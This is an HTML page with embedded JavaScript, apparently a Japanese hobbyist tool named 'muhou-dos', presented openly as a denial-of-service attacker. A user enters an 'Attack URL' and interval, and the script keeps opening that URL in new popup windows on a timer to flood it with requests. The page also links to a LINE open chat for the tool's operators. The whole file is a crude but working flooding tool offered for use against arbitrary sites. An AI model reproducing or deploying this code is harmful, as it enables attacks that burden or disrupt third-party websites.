<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>muhou-dos</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      background-color: #0d0f0a;
      color: #a0ff70;
      font-family: 'Courier New', Courier, monospace;
      padding: 20px;
      margin: 0;
      box-sizing: border-box;
    }
    h2 {
      text-shadow: 0 0 8px #39ff14;
      margin-bottom: 20px;
      font-size: 1.8rem;
    }
    label, input, button {
      font-family: monospace;
      font-weight: bold;
    }
    form {
      max-width: 400px;
      width: 100%;
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 6px;
      font-size: 1rem;
    }
    input[type="text"], input[type="number"] {
      background-color: #111a0b;
      border: 1px solid #39ff14;
      color: #a0ff70;
      padding: 10px 12px;
      width: 100%;
      margin-bottom: 16px;
      outline: none;
      transition: border-color 0.3s;
      font-size: 1rem;
      border-radius: 4px;
      box-sizing: border-box;
    }
    input[type="text"]:focus, input[type="number"]:focus {
      border-color: #7fff00;
      box-shadow: 0 0 8px #39ff14;
    }
    button {
      background-color: #223311;
      border: 1px solid #39ff14;
      color: #a0ff70;
      padding: 12px 20px;
      margin-right: 10px;
      cursor: pointer;
      transition: background-color 0.3s, color 0.3s;
      font-size: 1rem;
      border-radius: 6px;
      min-width: 110px;
      box-sizing: border-box;
    }
    button:hover:not(:disabled) {
      background-color: #39ff14;
      color: #0d0f0a;
      box-shadow: 0 0 10px #39ff14;
    }
    button:disabled {
      color: #555a44;
      border-color: #555a44;
      cursor: not-allowed;
      background-color: #111a0b;
      box-shadow: none;
    }
    .btn-group {
      margin-bottom: 15px;
      max-width: 400px;
      width: 100%;
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
    }
    #output {
      max-width: 400px;
      width: 100%;
      margin-top: 20px;
      background-color: #0f140a;
      border: 2px solid #39ff14;
      padding: 15px;
      height: 250px;
      overflow-y: auto;
      white-space: pre-line;
      box-shadow: 0 0 20px #39ff14 inset;
      border-radius: 6px;
      font-size: 14px;
      line-height: 1.4em;
      box-sizing: border-box;
    }
    #openchatBtn {
      display: inline-block;
      background-color: #00c300;
      color: white;
      font-weight: bold;
      padding: 14px 26px;
      border-radius: 8px;
      text-decoration: none;
      font-family: monospace;
      box-shadow: 0 0 8px #00ff00;
      transition: background-color 0.3s;
      margin-top: 30px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      box-sizing: border-box;
      font-size: 1.2rem;
    }
    #openchatBtn:hover {
      background-color: #00ff00;
      color: #0d0f0a;
    }

    @media (max-width: 440px) {
      body {
        padding: 12px;
      }
      h2 {
        font-size: 1.5rem;
      }
      button {
        min-width: auto;
        flex: 1 1 45%;
      }
      .btn-group {
        gap: 8px;
      }
      #output {
        height: 180px;
        font-size: 13px;
      }
      #openchatBtn {
        font-size: 1rem;
        padding: 12px 18px;
      }
    }
  </style>
</head>
<body>
  <h2>muhou-dos</h2>
  <form id="attackForm">
    <label for="attackURL">Attack URL：</label>
    <input type="text" id="attackURL" autocomplete="off" />
    <label for="interval">Interval（ms）：</label>
    <input type="number" id="interval" value="1000" />
    <button type="submit">表示</button>
  </form>

  <div class="btn-group">
    <button id="startBtn" disabled>実行開始</button>
    <button id="stopBtn" disabled>停止</button>
  </div>

  <div id="output" spellcheck="false"></div>

  <a id="openchatBtn" href="https://line.me/ti/g2/bPfiOwGTYvpGVRRQJYmI08Jj8_Q2WFhRyJLAhw?utm_source=invitation&utm_medium=link_copy&utm_campaign=default" target="_blank" rel="noopener noreferrer" aria-label="運営オープンチャットに参加">
    運営オープンチャットに参加
  </a>

  <script>
    let attackURL = '';
    let interval = 1000;
    let timerId = null;
    let count = 0;

    const output = document.getElementById('output');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const form = document.getElementById('attackForm');

    function log(msg) {
      output.innerText += msg + "\n";
      output.scrollTop = output.scrollHeight;
    }

    form.addEventListener('submit', (e) => {
      e.preventDefault();
      attackURL = document.getElementById('attackURL').value.trim();
      interval = parseInt(document.getElementById('interval').value, 10);
      if (!attackURL) {
        alert('Attack URLを入力してください');
        return;
      }
      output.innerText = '';
      log(`AttackURL：${attackURL}`);
      log(`Attack Interval：${(interval / 1000).toFixed(2)} 秒`);
      startBtn.disabled = false;
      stopBtn.disabled = true;
    });

    startBtn.addEventListener('click', () => {
      if (timerId !== null) return;
      count = 0;
      log('実行開始しました。');
      timerId = setInterval(() => {
        count++;
        window.open(attackURL, '_blank', 'width=400,height=300');
        log(`(${count}) ウィンドウを開きました`);
      }, interval);
      startBtn.disabled = true;
      stopBtn.disabled = false;
    });

    stopBtn.addEventListener('click', () => {
      stop();
      log('手動で停止しました。');
    });

    function stop() {
      if (timerId !== null) {
        clearInterval(timerId);
        timerId = null;
      }
      startBtn.disabled = false;
      stopBtn.disabled = true;
    }
  </script>
</body>
</html>
